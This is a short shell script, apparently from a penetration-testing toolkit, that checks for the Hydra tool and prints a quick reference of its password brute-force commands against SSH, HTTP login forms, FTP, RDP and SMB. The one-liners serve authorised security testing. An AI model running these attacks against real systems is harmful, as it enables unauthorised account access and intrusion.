#!/bin/sh
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
. "$SCRIPT_DIR/../common-script.sh"

ensure_tool hydra || exit 1

echo ""
info "=== Hydra Quick Reference ==="
info "SSH brute:         hydra -l user -P pass.txt ssh://target"
info "HTTP form:         hydra -l admin -P pass.txt target http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""
info "FTP brute:         hydra -l user -P pass.txt ftp://target"
info "RDP brute:         hydra -l admin -P pass.txt rdp://target"
info "SMB brute:         hydra -l admin -P pass.txt smb://target"
info "User list:         hydra -L users.txt -P pass.txt ssh://target"
echo ""
